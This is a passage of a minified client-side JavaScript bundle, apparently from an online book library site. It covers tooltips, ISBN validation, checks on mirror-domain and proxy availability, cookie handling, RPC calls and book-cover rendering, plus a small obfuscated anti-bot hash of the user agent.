t.parent?document.querySelector(t.parent):t.parent:this.parent=document.body.lastChild,this.parent.after(e),this.tooltip=document.querySelector(`#${e.id}`);let n=this.tooltip.querySelector(".close");n&&n.addEventListener("click",(()=>this.hide())),document.body.addEventListener("click",(()=>setTimeout((()=>this.hide()),400)))}isFit(t){switch(t){case"right":return this.parent.getBoundingClientRect().right+this.tooltip.offsetWidth+12<document.documentElement.clientWidth;case"top":case"topRight":case"topLeft":return this.parent.getBoundingClientRect().top>this.tooltip.offsetHeight+12;case"bottom":return this.parent.getBoundingClientRect().bottom+this.tooltip.offsetHeight+12<document.documentElement.clientHeight;case"left":return this.parent.getBoundingClientRect().left>this.tooltip.offsetWidth+12}return!1}show(t){this.tooltip.setAttribute("style","");const e=10,n={side:"right",order:["right","topRight","top","topLeft","bottom","left"]};let i={x:0,y:0},r="",o=n.side,s=n.order,a="";if(null!=t){if(null!==t.parent&&void 0!==t.parent){this.parent="string"==typeof t.parent?document.querySelector(t.parent):t.parent;const e=this.parent.getBoundingClientRect().left+window.scrollX;a+=`top: ${this.parent.getBoundingClientRect().bottom+window.scrollY}px; left: ${e}px; `}"string"==typeof t?o=t:(o=null!==t.side&&void 0!==t.side?t.side:n.side,s=null!==t.order&&void 0!==t.order?t.order:n.order)}const l={right:{x:this.parent.offsetWidth+e,y:-(this.parent.offsetHeight+this.tooltip.offsetHeight)/2},top:{x:(this.parent.offsetWidth-this.tooltip.offsetWidth)/2,y:-(this.parent.offsetHeight+this.tooltip.offsetHeight+e)},topRight:{x:this.parent.offsetWidth-this.tooltip.offsetWidth,y:-(this.parent.offsetHeight+this.tooltip.offsetHeight+e)},topLeft:{x:0,y:-(this.parent.offsetHeight+this.tooltip.offsetHeight+e)},bottom:{x:(this.parent.offsetWidth-this.tooltip.offsetWidth)/2,y:e},left:{x:-(this.tooltip.offsetWidth+e)-4,y:-(this.parent.offsetHeight+this.tooltip.offsetHeight)/2}};if(this.isFit(o))i=l[o],r=`show-${o}`;else for(const t of s)if(this.isFit(t)){i=l[t],r=`show-${t}`;break}return this.tooltip.className=this.tooltip.className.replace(/ show-[a-z]+/i,"")+` ${r}`,this.tooltip.setAttribute("style",a+`transform: translate(${i.x}px, ${i.y}px);`),this.tooltip.dispatchEvent(new Event("shown")),this.tooltip.id}hide(){this.tooltip.setAttribute("style","display:none")}}class ISBN{static valid10(t){if(10==(t=ISBN.clear(t)).length){let e=0;for(let n in[...t])e+="x"==t[n].toLowerCase()?10*(10-parseInt(n)):(10-parseInt(n))*parseInt(t[n]);return e%11==0}return!1}static valid13(t){if(13==(t=ISBN.clear(t)).length){let e=0;for(let n in[...t])e+=parseInt(n)%2==0?parseInt(t[n]):3*parseInt(t[n]);return e%10==0}return!1}}ISBN.clear_isbn_pattern=/[^0-9x]/gi,ISBN.isbn10_pattern=/^\d{9}[0-9x]$/i,ISBN.isbn13_pattern=/^97[89]\d{10}$/,ISBN.clear=t=>t.replace(ISBN.clear_isbn_pattern,""),ISBN.check=t=>ISBN.isbn10_pattern.test(ISBN.clear(t))||ISBN.isbn13_pattern.test(ISBN.clear(t)),ISBN.valid=t=>!!ISBN.check(t)&&(ISBN.valid10(t)||ISBN.valid13(t));var _0x5466=["navigator","toString","fromCharCode","userAgent","indexOf","substr","length","^9+57","charCodeAt","replace","href"];!function(t,e){!function(e){for(;--e;)t.push(t.shift())}(++e)}(_0x5466,212);var _0x2c7e=function(t,e){return _0x5466[t-=0]};function _0x371adf(t){return function(){var e,n,i,r,o,s,a,l,c,u=function(t,e){return t<<e|t>>>32-e},d=function(t,e){var n,i,r,o,s;return r=2147483648&t,o=2147483648&e,s=(1073741823&t)+(1073741823&e),(n=1073741824&t)&(i=1073741824&e)?2147483648^s^r^o:n|i?1073741824&s?3221225472^s^r^o:1073741824^s^r^o:s^r^o},h=function(t,e,n,i,r,o,s){var a;return t=d(t,d(d((a=e)&n|~a&i,r),s)),d(u(t,o),e)},f=function(t,e,n,i,r,o,s){var a;return t=d(t,d(d(e&(a=i)|n&~a,r),s)),d(u(t,o),e)},p=function(t,e,n,i,r,o,s){return t=d(t,d(d(e^n^i,r),s)),d(u(t,o),e)},g=function(t,e,n,i,r,o,s){return t=d(t,d(d(n^(e|~i),r),s)),d(u(t,o),e)},m=function(t){var e,n="",i="";for(e=0;e<=3;e++)n+=(i="0"+(t>>>8*e&255)[_0x2c7e("0x9")](16))[_0x2c7e("0x2")](i.length-2,2);return n},v=Array(),y=_0x2c7e("0x4");for(v=function(t){for(var e,n=t[_0x2c7e("0x3")],i=n+8,r=16*((i-i%64)/64+1),o=Array(r-1),s=0,a=0;a<n;)s=a%4*8,o[e=(a-a%4)/4]=o[e]|t[_0x2c7e("0x5")](a)<<s,a++;return s=a%4*8,o[e=(a-a%4)/4]=o[e]|128<<s,o[r-2]=n<<3,o[r-1]=n>>>29,o}(function(t){t=t[_0x2c7e("0x6")](/\r\n/g,"\n");for(var e="",n=0;n<t.length;n++){var i=t[_0x2c7e("0x5")](n);i<128?e+=String[_0x2c7e("0xa")](i):i>127&&i<2048?(e+=String[_0x2c7e("0xa")](i>>6|192),e+=String[_0x2c7e("0xa")](63&i|128)):(e+=String[_0x2c7e("0xa")](i>>12|224),e+=String[_0x2c7e("0xa")](i>>6&63|128),e+=String[_0x2c7e("0xa")](63&i|128))}return e}("-6"+window[_0x2c7e("0x8")][_0x2c7e("0x0")]+y)),s=1732584193,a=4023233417,l=2562383102,c=271733878,e=0;e<v[_0x2c7e("0x3")];e+=16)n=s,i=a,r=l,o=c,s=h(s,a,l,c,v[e+0],7,3614090360),c=h(c,s,a,l,v[e+1],12,3905402710),l=h(l,c,s,a,v[e+2],17,606105819),a=h(a,l,c,s,v[e+3],22,3250441966),s=h(s,a,l,c,v[e+4],7,4118548399),c=h(c,s,a,l,v[e+5],12,1200080426),l=h(l,c,s,a,v[e+6],17,2821735955),a=h(a,l,c,s,v[e+7],22,4249261313),s=h(s,a,l,c,v[e+8],7,1770035416),c=h(c,s,a,l,v[e+9],12,2336552879),l=h(l,c,s,a,v[e+10],17,4294925233),a=h(a,l,c,s,v[e+11],22,2304563134),s=h(s,a,l,c,v[e+12],7,1804603682),c=h(c,s,a,l,v[e+13],12,4254626195),l=h(l,c,s,a,v[e+14],17,2792965006),s=f(s,a=h(a,l,c,s,v[e+15],22,1236535329),l,c,v[e+1],5,4129170786),c=f(c,s,a,l,v[e+6],9,3225465664),l=f(l,c,s,a,v[e+11],14,643717713),a=f(a,l,c,s,v[e+0],20,3921069994),s=f(s,a,l,c,v[e+5],5,3593408605),c=f(c,s,a,l,v[e+10],9,38016083),l=f(l,c,s,a,v[e+15],14,3634488961),a=f(a,l,c,s,v[e+4],20,3889429448),s=f(s,a,l,c,v[e+9],5,568446438),c=f(c,s,a,l,v[e+14],9,3275163606),l=f(l,c,s,a,v[e+3],14,4107603335),a=f(a,l,c,s,v[e+8],20,1163531501),s=f(s,a,l,c,v[e+13],5,2850285829),c=f(c,s,a,l,v[e+2],9,4243563512),l=f(l,c,s,a,v[e+7],14,1735328473),s=p(s,a=f(a,l,c,s,v[e+12],20,2368359562),l,c,v[e+5],4,4294588738),c=p(c,s,a,l,v[e+8],11,2272392833),l=p(l,c,s,a,v[e+11],16,1839030562),a=p(a,l,c,s,v[e+14],23,4259657740),s=p(s,a,l,c,v[e+1],4,2763975236),c=p(c,s,a,l,v[e+4],11,1272893353),l=p(l,c,s,a,v[e+7],16,4139469664),a=p(a,l,c,s,v[e+10],23,3200236656),s=p(s,a,l,c,v[e+13],4,681279174),c=p(c,s,a,l,v[e+0],11,3936430074),l=p(l,c,s,a,v[e+3],16,3572445317),a=p(a,l,c,s,v[e+6],23,76029189),s=p(s,a,l,c,v[e+9],4,3654602809),c=p(c,s,a,l,v[e+12],11,3873151461),l=p(l,c,s,a,v[e+15],16,530742520),s=g(s,a=p(a,l,c,s,v[e+2],23,3299628645),l,c,v[e+0],6,4096336452),c=g(c,s,a,l,v[e+7],10,1126891415),l=g(l,c,s,a,v[e+14],15,2878612391),a=g(a,l,c,s,v[e+5],21,4237533241),s=g(s,a,l,c,v[e+12],6,1700485571),c=g(c,s,a,l,v[e+3],10,2399980690),l=g(l,c,s,a,v[e+10],15,4293915773),a=g(a,l,c,s,v[e+1],21,2240044497),s=g(s,a,l,c,v[e+8],6,1873313359),c=g(c,s,a,l,v[e+15],10,4264355552),l=g(l,c,s,a,v[e+6],15,2734768916),a=g(a,l,c,s,v[e+13],21,1309151649),s=g(s,a,l,c,v[e+4],6,4149444226),c=g(c,s,a,l,v[e+11],10,3174756917),l=g(l,c,s,a,v[e+2],15,718787259),a=g(a,l,c,s,v[e+9],21,3951481745),s=d(s,n),a=d(a,i),l=d(l,r),c=d(c,o);var b=t[_0x2c7e("0x7")][_0x2c7e("0x1")]("?")>=0?"&":"?";return t[_0x2c7e("0x7")]=t[_0x2c7e("0x7")]+b+"jsh="+m(s)+m(a),!0}()}function ProxyChecker(t){this.refreshAfter=3600,this.scope="proxies",this.pathToTest="/speedtest/1pixel.png",this.testProxy=function(t){let e=this;$.ajax({url:"https://"+t+"/"+this.pathToTest,type:"GET",success:function(n,i,r){200===r.status&&r.responseText.length?e.setStatus(t,!0):e.setStatus(t,!1)},error:function(){e.setStatus(t,!1)}})},this.setStatus=function(t,e){let n=this.getAllStates();n[t]={status:e,lastUpdate:Math.floor((new Date).getTime()/1e3)},localStorage.setItem(this.scope+"States",JSON.stringify(n)),this.syncCookies()},this.syncCookies=function(){let t=[];$.each(this.getAllStates(),(function(e,n){!1===n.status&&t.push(e)})),t.length?setCookie(this.scope+"NotWorking",t.join(),1e3*this.refreshAfter*2):setCookie(this.scope+"NotWorking",t.join(),-1)},this.getStatus=function(t){let e=this.getAllStates();return e[t]?e[t]:{}},this.getAllStates=function(){return localStorage.getItem(this.scope+"States")?JSON.parse(localStorage.getItem(this.scope+"States")):{}},this.clearExcept=function(t){currentStates=this.getAllStates(),$.each(currentStates,(function(e,n){-1===t.indexOf(e)&&delete currentStates[e]})),localStorage.setItem(this.scope+"States",JSON.stringify(currentStates))},this.refreshAll=function(){let t=this,e=this.getAllStates(),n=Math.floor((new Date).getTime()/1e3);$.each(e,(function(e,i){n-i.lastUpdate>t.refreshAfter&&t.testProxy(e)}))},this.refresh=function(t){let e=Math.floor((new Date).getTime()/1e3),n=this.getStatus(t);n&&n.lastUpdate&&e-n.lastUpdate<this.refreshAfter||this.testProxy(t)}}function DomainsCheckerByParts(t,e,n,i,r=10,o=5){t.other||(t.other=[]);let s=!1;const a=t.regional,l={},c=function(n,i,r){d.stopInterval(),d.enabled=!1,s||r||-1===t.other.indexOf(n)||(s=!0,$.RPC("Metric::rpcEvent",{name:"otherDomainAvailable",value:1,tags:{mode:i,region:Config.BRegion,country:Config.Country}})),e(n,i)},u=function(t,e,i){Object.assign(l,t),d.domains.count()?d.stopInterval().doCheck().startInterval():(d.stopInterval(),checkInternetConnection(l,e,i,n),clearDomainsStatuses())},d={intervalId:null,enabled:!0,domains:{originalList:[],stack:[],set:function(t){this.originalList=Array.from(t),this.stack=Array.from(t)},get:function(){return this.originalList},splice:function(t){return this.stack.splice(0,t)},count:function(){return this.stack.length}},startInterval:function(){if(this.enabled&&null===this.intervalId&&this.domains.count()>0){const t=this;t.intervalId=setInterval((function(){t.doCheck()}),1e3*o)}},stopInterval:function(){return this.intervalId&&(clearInterval(this.intervalId),this.intervalId=null),this},doCheck:function(){const t=this.domains.splice(r);return t.length?DomainsChecker(t,c,u,i,!0):this.stopInterval(),this}};d.domains.set(t.other),window.localStorage&&localStorage.getItem("domainStatus")&&DomainsChecker(a.concat(d.domains.get()),c,u,i,!0,!1),DomainsChecker(a,c,u,i,!0),d.startInterval()}function DomainsChecker(t,e,n,i,r=!1,o=!0){n=void 0!==n?n:null,i=void 0!==i?i:"books";let s=[],a=!1;function l(){let t=localStorage.getItem("domainStatus")?JSON.parse(localStorage.getItem("domainStatus")):{};return $.each(t,(function(e,n){n.ip===CurrentClientIP&&n.lastUpdated===(new Date).getDate()||delete t[e]})),t}function c(){return s.filter((function(t){return!1===t.fromStorage}))}function u(t,o,u){let d=!0,h=!0,f=!1;u&&function(t,e){const n=l();n[t.name]={status:e,lastUpdated:(new Date).getDate(),ip:CurrentClientIP},localStorage.setItem("domainStatus",JSON.stringify(n))}(t,o),t.status=o;for(let e=0;e<s.length;e++)"unknown"==s[e].status&&(d=!1),"unknown"==s[e].status&&t.priority>e&&(h=!1),"success"!=s[e].status||f||(f=s[e]);if(f&&!a&&(d||h&&f.priority<=t.priority))return!0===r?e(f.name,i,!u):e(f.name,i),saveDomainStatusToCookie(f.name,i),void(a=!0);if(d&&!a){const t={};s.forEach((function(e){t[e.name]={status:e.status,cache:e.fromStorage}})),!0!==r?(checkInternetConnection(t,i,c().length>0,n),clearDomainsStatuses()):n&&n(t,i,c().length>0)}return!1}$.each(t,(function(t,e){s[t]={priority:t,name:e,status:"unknown",fromStorage:!1}})),$.each(s,(function(t,e){let n=l();if(n[e.name]&&"unknown"!==n[e.name].status)return s[t].fromStorage=!0,void u(e,n[e.name].status,!1);!1!==o&&$.ajax({url:"//"+e.name+"/1pixel.php?v="+(new Date).getTime(),timeout:7e3,success:function(t,n,i){const r=200===i.status&&i.responseText.length?"success":"failed";u(e,r,!0)},error:function(t,n,i){u(e,"failed",!0)}})}))}function checkInternetConnection(t,e,n,i){const r=function(r){r&&$.RPC("Metric::rpcEvent",{name:"noDomainAvailable",value:1,tags:{mode:e,region:Config.BRegion,country:Config.Country}}),"books"===e&&!0===n?(t["iana.org"]={status:r?"success":"failed",cache:!1},noDomainAvailableLog({country:Config.Country,domains:t},(function(n){i&&i(t,e,n.code)}))):"function"==typeof i&&i(t,e)},o=setTimeout((function(){r(!1)}),5e3),s=document.createElement("img");s.onload=function(){clearTimeout(o),r(!0)},s.onerror=function(){clearTimeout(o),r(!1)},s.src="https://www.iana.org/favicon.ico?_="+(new Date).getTime()}function noDomainAvailableLog(t,e){new StorybookResponse("/papi/user/no-domain-available-found-log",t).success((function(t){e(t)})).fetch()}function getDomainStatusesFromCookie(){let t=getCookie("domains-availability")||'{"books": false, "articles": false, "redirector": false, "singlelogin": false}';return t=JSON.parse(t),t}function saveDomainStatusToCookie(t,e){let n=getDomainStatusesFromCookie();n||(n={books:!1,articles:!1,redirector:!1,singlelogin:!1}),n[e]=t,setCookie("domains-availability",JSON.stringify(n),864e5)}function clearDomainsStatuses(){window.localStorage&&localStorage.removeItem("domainStatus"),setCookie("domains-availability","",-1)}var Utf8={encode:function(t){t=t.replace(/\r\n/g,"\n");for(var e="",n=0;n<t.length;n++){var i=t.charCodeAt(n);i<128?e+=String.fromCharCode(i):i>127&&i<2048?(e+=String.fromCharCode(i>>6|192),e+=String.fromCharCode(63&i|128)):(e+=String.fromCharCode(i>>12|224),e+=String.fromCharCode(i>>6&63|128),e+=String.fromCharCode(63&i|128))}return e},decode:function(t){for(var e="",n=0,i=c1=c2=0;n<t.length;)(i=t.charCodeAt(n))<128?(e+=String.fromCharCode(i),n++):i>191&&i<224?(c2=t.charCodeAt(n+1),e+=String.fromCharCode((31&i)<<6|63&c2),n+=2):(c2=t.charCodeAt(n+1),c3=t.charCodeAt(n+2),e+=String.fromCharCode((15&i)<<12|(63&c2)<<6|63&c3),n+=3);return e}};function setCookie(t,e,n,i,r,o){o=void 0===o||o;var s=new Date;s.setTime(s.getTime()),i||(i="/");var a=new Date(s.getTime()+n);document.cookie=t+"="+escape(e)+(n?"; expires="+a:"")+(i?"; path="+i:"/")+(r?"; domain="+r:"; domain=."+Config.domainHost)+(o?"; secure":"")+"; samesite=None"}function removeCookie(t){document.cookie=t+"=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;"}function getCookie(t){var e=" "+document.cookie,n=" "+t+"=",i=null,r=0,o=0;return e.length>0&&-1!=(r=e.indexOf(n))&&(r+=n.length,-1==(o=e.indexOf(";",r))&&(o=e.length),i=unescape(e.substring(r,o))),i}function redirectWithCounting(t,e){let n=getCookie("redirects_count")?JSON.parse(getCookie("redirects_count")):{};n[t]?n[t]=n[t]+1:n[t]=1,setCookie("redirects_count",JSON.stringify(n),1e4),location.href=e}$((function(){$("#searchFieldx").focus((function(){$(".b-search-form").addClass("hover")})),$("#searchFieldx").blur((function(){$(".b-search-form").removeClass("hover")})),$("#advSearch-control").click((function(){return $("#advSearch select").removeAttr("disabled"),$("#advSearch input").removeAttr("disabled"),$("#advSearch").attr("style","display: block !important;"),$(this).hide(),!1})),$("div.adc").each((function(){ga("send",{hitType:"event",eventCategory:"ad",eventAction:"show",eventLabel:$(this).data("bucket-id")})})),$(".z-book-cover").each((function(){makeBookCover($(this))})),$(".z-book-none-cover").each((function(){makeBookWithoutCover($(this))})),isTouchDevice()&&($("#footer .row").addClass("touch-device"),$(document).on("click","a.addDownloadedBook, a.dlButton, .share-to-widget .menu-row-link a",(function(){const t=$(this).attr("href");if("string"==typeof t&&t.length)return window.open(t),!1}))),$(document).on("click",".addDownloadedBook",(function(){CurrentUser.addDownloadedBook($(this).data("book_id"))}))})),$(window).bind("pageshow",(function(t){if(t.originalEvent.persisted){const t=$("table.super-puper-main-container");0==t.width()&&t.css("width","100%")}})),$.RPC=function(t,e,n){var i=$.Deferred(),r={type:"post",data:_.extend(e||{},{gg_json_mode:1}),dataType:"json"},o=(n=n||{}).dh||n.defaultHandlers||!1;function s(t){return t.hasCode=function(e){var n=_(t).map((function(t){return t.code.toString()}));return _(n).indexOf(e.toString())>-1},t.message=function(){return _(t).map((function(t){return t.message.toString()})).join(";")},t}n=$.extend(!0,r,n||{}),"undefined"==typeof PARSEIT_RPC_DOMAIN&&(PARSEIT_RPC_DOMAIN=""),n.url=PARSEIT_RPC_DOMAIN+"rpc.php",n.data.action=t,o&&i.done((function(){Notify.sayOk()})).fail((function(){Notify.sayError()}));var a=function(t){return null==t?i.reject(s([{code:"unknown",message:"unknown error: null response"}])):(t.errors,t.errors.length||!1===t[0]||t._error?i.reject(s(t.errors),t):i.resolve(t))};if(e instanceof jQuery){var l,c,u=e,d="rpciframe"+(new Date).getTime();!1!==n.rerender&&(c=u.clone(!0),i.always((function(){u.replaceWith(c)}))),l=$("<iframe/>",{id:d,name:d,css:{display:"none"}}).load((function(){console.log(l[0].contentWindow);var t=l[0].contentWindow._RESP;void 0!==t&&(a(t),l.unbind("load").remove())})).appendTo("body"),u.attr({action:n.url,target:d}).append($('<input type="hidden" name="action" />').val(t)).unbind("submit").submit()}else $.ajax(n).done(a).fail((function(e,n,r){console.log("RPC error when performing ",t,": ",n,r),i.reject(s([{code:n,message:r}]))}));return i.promise()},window.addEventListener("load",(()=>window!=top?document.body.remove():null));var updateQueryStringParam=function(t,e){var n=[location.protocol,"//",location.host,location.pathname].join(""),i=document.location.search,r=t+"="+e,o="?"+r;return i&&(updateRegex=new RegExp("([?&])"+t+"[^&]*"),removeRegex=new RegExp("([?&])"+t+"=[^&;]+[&;]?"),o=void 0===e||null==e||""==e?(o=i.replace(removeRegex,"$1")).replace(/[&;]$/,""):null!==i.match(updateRegex)?i.replace(updateRegex,"$1"+r):i+"&"+r),n+o};function makeBookCover(t){if(t.hasClass("covered"))return;const e=t.find("img");e.length&&setTimeout((function n(){if(!e[0].complete)return setTimeout(n,100);t.addClass("covered")}),100)}function makeBookWithoutCover(t,e=!1){if(t.hasClass("covered")&&!e)return;const n=t.data("id"),i=t.data("title");let r=t.data("author");if(r||(r="Unknown"),!i||!r)return;const o=getBookCoverColorsById(n);let s=50,a=40,l=2;t.hasClass("medium")?(s=80,a=60,l=3):t.hasClass("high")&&(s=100,a=80,l=4);const c=$('<div class="c-book" style="border: 1px solid #'+o.from+"; background: linear-gradient(140deg, #"+o.from+" 60%, #"+o.to+' 100%);"><div style="visibility: hidden" class="c-book-title">'+(i.length>a?i.substring(0,a)+"...":i)+'</div><div class="c-book-authors">'+(r.length>s?r.substring(0,s)+"...":r)+"</div></div>");t.css({"border-bottom":"1px solid #"+o.from,"border-right":"1px solid #"+o.to}).addClass("covered").html(c);const u=t.find(".c-book-title"),d=t.find(".c-book-authors"),h="requestIdleCallback"in window?t=>window.requestIdleCallback(t):t=>setTimeout(t);u.css("visibility","visible"),h((function t(){if(!u.is(":visible"))return h(t);window.ellipsed.ellipsis(u[0],l,{delimiter:""}),window.ellipsed.ellipsis(d[0],2,{delimiter:""})}))}function getBookCoverColorsById(t){const e={from:"8ec7e0",to:"a7e0f9"};if(!(t=t.toString()).length)return e;const n=[["8ec7e0","a7e0f9"],["b5d899","cef1b2"],["b9c5c8","d2dee1"],["eac797","ffe0b0"],["e88d67","ffa680"],["a6a7d9","bfc0f2"],["c4c4a8","ddddc1"],["bebec7","d7d7e0"],["dadaa2","f3f3bb"],["c0bf70","d9d889"],["a39fd8","bcb8f1"],["c2bfab","dbd8c4"],["bdbcc7","d6d5e0"],["dcdfa5","f5f8be"],["c5cc72","dee58b"],["90d5d4","a9eeed"],["b6b4b6","cfcdcf"],["b9c6c6","d2dfdf"],["e8abad","ffc4c6"],["b8b8b8","d1d1d1"],["c6c6c6","dfdfdf"],["c1c1c1","dadada"],["cbcbcb","e4e4e4"],["a3a3a3","bcbcbc"],["98b4dc","b1cdf5"],["bbcca0","d4e5b9"],["bbc1c7","d4dae0"],["e3d29d","fcebb6"],["d7ab6b","f0c484"],["99b8dc","b2d1f5"],["bccea1","d5e7ba"],["bbc1c7","d4dae0"],["e3d09d","fce9b6"],["d5a46c","eebd85"],["8fcddb","a8e6f4"],["b6c7a4","cfe0bd"],["b9c5c7","d2dee0"],["e8ba9f","ffd3b8"],["a5bfca","bed8e3"],["beceb1","d7e7ca"],["bdc3c4","d6dcdd"],["d9c9b3","f2e2cc"],["c29988","dbb2a1"],["8ec7e0","a7e0f9"],["b5d899","cef1b2"],["b9c5c8","d2dee1"],["eac797","ffe0b0"],["e88d67","ffa680"],["a6a7d9","bfc0f2"],["c4c4a8","ddddc1"],["bebec7","d7d7e0"],["dadaa2","f3f3bb"],["c0bf70","d9d889"],["a39fd8","bcb8f1"],["c2bfab","dbd8c4"],["bdbcc7","d6d5e0"],["dcdfa5","f5f8be"],["c5cc72","dee58b"],["90d5d4","a9eeed"],["b6b4b6","cfcdcf"],["b9c6c6","d2dfdf"],["e8abad","ffc4c6"],["b8b8b8","d1d1d1"],["c6c6c6","dfdfdf"],["c1c1c1","dadada"],["cbcbcb","e4e4e4"],["a3a3a3","bcbcbc"],["98b4dc","b1cdf5"],["bbcca0","d4e5b9"],["bbc1c7","d4dae0"],["e3d29d","fcebb6"],["d7ab6b","f0c484"],["99b8dc","b2d1f5"],["bccea1","d5e7ba"],["bbc1c7","d4dae0"],["e3d09d","fce9b6"],["d5a46c","eebd85"],["8fcddb","a8e6f4"],["b6c7a4","cfe0bd"],["b9c5c7","d2dee0"],["e8ba9f","ffd3b8"],["a5bfca","bed8e3"],["beceb1","d7e7ca"],["bdc3c4","d6dcdd"],["d9c9b3","f2e2cc"],["c29988","dbb2a1"],["8ec7e0","a7e0f9"],["b5d899","cef1b2"],["b9c5c8","d2dee1"],["eac797","ffe0b0"],["e88d67","ffa680"],["a6a7d9","bfc0f2"],["c4c4a8","ddddc1"],["bebec7","d7d7e0"],["dadaa2","f3f3bb"],["c0bf70","d9d889"],["a39fd8","bcb8f1"],["c2bfab","dbd8c4"],["bdbcc7","d6d5e0"],["dcdfa5","f5f8be"]],i=t.substring(t.length-2);return n[i]?{from:n[i][0],to:n[i][1]}:e}function getShortDomain(t){return"onion"===t.substring(t.length-5)&&(t=t.substring(0,10)+"..."+t.substring(t.length-10)),t}function initCategoriesFilter(t){const e=t||{},n=$(".categoriesFilter");if(!n.length||1==n.data("init"))return;n.data("init",1);const i=n.find(".categoriesFilter__button"),r=n.find(".categoriesFilter__dialog"),o=n.find(".categoriesFilter__dialogMain"),s=n.find(".categoriesFilter__searchFieldInput"),a=n.find(".categoriesFilter__searchFieldIcon"),l=n.find(".categoriesFilter__listItem");let c=[],u=null;if(e.selectedCategoryId){const t=n.find(".categoriesFilter__listItem[data-id="+e.selectedCategoryId+"]"),i=t.parents(".categoriesFilter__listItem");i.length?(t.find(".categoriesFilter__listLink").addClass("categoriesFilter__listLink_state_active"),i.find(".categoriesFilter__listToggle").addClass("categoriesFilter__listToggle_state_active")):(t.find(".categoriesFilter__listToggle").addClass("categoriesFilter__listToggle_state_active"),t.find(".categoriesFilter__listItemContainer").addClass("categoriesFilter__listItemContainer_state_active"))}"function"==typeof e.onSelectedListItem&&l.find(".categoriesFilter__listLink").on("click",(function(t){const r=$(t.target).closest(".categoriesFilter__listItem"),o=r.parents(".categoriesFilter__listItem");if(n.find(".categoriesFilter__listToggle_state_active").removeClass("categoriesFilter__listToggle_state_active"),n.find(".categoriesFilter__listLink_state_active").removeClass("categoriesFilter__listLink_state_active"),o.length)r.find(".categoriesFilter__listLink").addClass("categoriesFilter__listLink_state_active"),o.find(".categoriesFilter__listToggle").addClass("categoriesFilter__listToggle_state_active"),o.find(".categoriesFilter__listItemContainer").removeClass("categoriesFilter__listItemContainer_state_active");else{if(e.disableSelectionFirstLevelCategory)return r.closest(".categoriesFilter__listItem").find(".categoriesFilter__listToggle").trigger("click"),!1;r.find(".categoriesFilter__listToggle").addClass("categoriesFilter__listToggle_state_active"),r.find(".categoriesFilter__listItemContainer").addClass("categoriesFilter__listItemContainer_state_active")}let s=r.data("name");return o.length&&(s=o.data("name")+" - "+s),n.find(".categoriesFilter__buttonLabel").text(s),i.trigger("click"),e.onSelectedListItem(r),!1})),"function"==typeof e.onReset&&n.find(".categoriesFilter__resetButton").on("click",(function(){return n.find(".categoriesFilter__buttonLabel").text(""),n.find(".categoriesFilter__listToggle_state_active").removeClass("categoriesFilter__listToggle_state_active"),n.find(".categoriesFilter__listLink_state_active").removeClass("categoriesFilter__listLink_state_active"),s.val("").trigger("input"),e.onReset(),i.trigger("click"),!1}));let d=!0;function h(t){if(t=t||"",l.show(),o.removeClass("categoriesFilter__dialogMain_empty").scrollTop(0),s.removeClass("categoriesFilter__searchFieldInput_state_error"),""===t)return void c.forEach((function(t){t.$link.text(t.name),t.$toggle.show().filter(".categoriesFilter__listToggle_state_open").trigger("click")}));const e=new RegExp(`(${t})`,"ig");let n=0;c.forEach((function(t){t.$toggle.not(".categoriesFilter__listToggle_state_open").hide(),e.test(t.name)?(t.$link.html(t.name.replace(e,"<mark>$1</mark>")),t.$parent.show(),t.$toggle.show().not(".categoriesFilter__listToggle_state_open").trigger("click"),n++):t.$.hide()})),n||(o.addClass("categoriesFilter__dialogMain_empty"),s.addClass("categoriesFilter__searchFieldInput_state_error"))}i.on("click",(function(t){if(t.preventDefault(),r.toggleClass("categoriesFilter__dialog_show"),d=!d,r.hasClass("categoriesFilter__dialog_show")?window.innerWidth>768&&s.focus():(s.val(""),h()),r.hasClass("categoriesFilter__dialog_show")){const t=o.find(".categoriesFilter__listToggle_state_active"),e=o.find(".categoriesFilter__listLink_state_active").closest(".categoriesFilter__listItem");if(e.length){t.trigger("click");const n=e.parents(".categoriesFilter__listItem");o.animate({scrollTop:n.position().top+e.position().top},0)}else if(t.length){const e=t.closest(".categoriesFilter__listItem");o.animate({scrollTop:e.position().top},0)}}})),$("body").on("click",(function(t){d||$(t.target).closest(n).length||(r.removeClass("categoriesFilter__dialog_show"),s.val(""),h(),d=!0)})),l.each((function(){const t=$(this),e=t.parents(".categoriesFilter__listItem");c.push({$:t,$link:t.find(".categoriesFilter__listLink"),$parent:e,$toggle:e.find(".categoriesFilter__listToggle"),id:t.data("id"),name:t.data("name"),parentId:t.data("parent-id")})})),s.val("").on("input",(function(t){u&&(clearTimeout(u),u=null),a.addClass(".categoriesFilter__searchFieldIcon_state_loading"),u=setTimeout((()=>{h(this.value.trim()),a.removeClass(".categoriesFilter__searchFieldIcon_state_loading")}),500)})),n.find(".categoriesFilter__listToggle").on("click",(function(t){t.preventDefault(),$(this).toggleClass("categoriesFilter__listToggle_state_open").parent().nextAll(".categoriesFilter__list_type_child").toggle();const e=$(this).closest(".categoriesFilter__listItem").position().top;o.scrollTop()>e&&o.scrollTop(e)}))}function stripEmodji(t){return t.replace(/(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g,"")}function isValidInputString(t){return t&&t.length&&$.trim($("<i>"+t+"</i>").text()).length==t.length}function isTouchDevice(){return"ontouchstart"in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0}function rawurlencode(t){return encodeURIComponent(t).replace(/!/g,"%21").replace(/'/g,"%27").replace(/\(/g,"%28").replace(/\)/g,"%29").replace(/\*/g,"%2A")}function makeModal(t,e,n){const i=t=>"string"==typeof 